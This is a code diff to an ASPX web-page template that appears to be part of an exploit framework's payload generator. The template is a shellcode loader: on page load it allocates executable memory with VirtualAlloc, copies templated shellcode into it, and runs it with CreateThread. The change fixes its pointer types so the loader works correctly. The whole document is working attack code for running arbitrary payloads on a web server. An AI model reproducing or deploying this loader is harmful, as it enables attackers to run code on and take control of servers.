@@ -1,24 +1,21 @@
 <%%@ Page Language="C#" AutoEventWireup="true" %%>
 <%%@ Import Namespace="System.IO" %%>
 <script runat="server">
-    private static UInt32 MEM_COMMIT=0x1000;
-    private static UInt32 PAGE_EXECUTE_READWRITE=0x40;
+    private static Int32 MEM_COMMIT=0x1000;
+    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;
 
     [System.Runtime.InteropServices.DllImport("kernel32")]
-    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size,UInt32 flAllocationType,UInt32 flProtect);
+    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);
 
     [System.Runtime.InteropServices.DllImport("kernel32")]
-    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes,UInt32 dwStackSize, UInt32 lpStartAddress,IntPtr param,UInt32 dwCreationFlags,ref UInt32 lpThreadId);
+    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);
 
     protected void Page_Load(object sender, EventArgs e)
     {
         %{shellcode}
-
-        UInt32 %{var_funcAddr} = VirtualAlloc(0,(UInt32)%{var_bytearray}.Length,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
-        System.Runtime.InteropServices.Marshal.Copy(%{var_bytearray},0,(IntPtr)(%{var_funcAddr}),%{var_bytearray}.Length);
-        IntPtr %{var_hThread} = IntPtr.Zero;
-        IntPtr %{var_pInfo} = IntPtr.Zero;
-        UInt32 %{var_threadId} = 0;
-        %{var_hThread} = CreateThread(0,0,%{var_funcAddr},%{var_pInfo},0,ref %{var_threadId});
+        IntPtr %{var_funcAddr} = VirtualAlloc(IntPtr.Zero,(UIntPtr)%{var_bytearray}.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        System.Runtime.InteropServices.Marshal.Copy(%{var_bytearray},0,%{var_funcAddr},%{var_bytearray}.Length);
+        IntPtr %{var_threadId} = IntPtr.Zero;
+        IntPtr %{var_hThread} = CreateThread(IntPtr.Zero,UIntPtr.Zero,%{var_funcAddr},IntPtr.Zero,0,ref %{var_threadId});
     }
 </script>
